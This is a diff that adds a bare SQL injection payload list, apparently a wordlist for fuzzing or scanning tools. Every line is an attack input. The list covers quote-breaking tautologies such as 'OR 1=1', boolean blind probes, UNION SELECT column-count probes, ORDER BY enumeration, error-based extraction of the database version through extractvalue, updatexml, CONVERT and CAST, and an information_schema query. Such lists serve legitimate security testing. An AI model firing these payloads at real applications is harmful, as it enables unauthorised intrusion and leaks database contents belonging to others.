@@ -1,0 +1,22 @@
+'
+''
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' #
+1' AND 1=1 --
+1' AND 1=2 --
+1' OR '1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--
+1' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--
+1' AND 1=CONVERT(int, (SELECT @@version))--
+1' AND 1=CAST((SELECT @@version) AS int)--
+1' AND 1=1 ORDER BY 1--
+1' AND 1=1 ORDER BY 1000--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
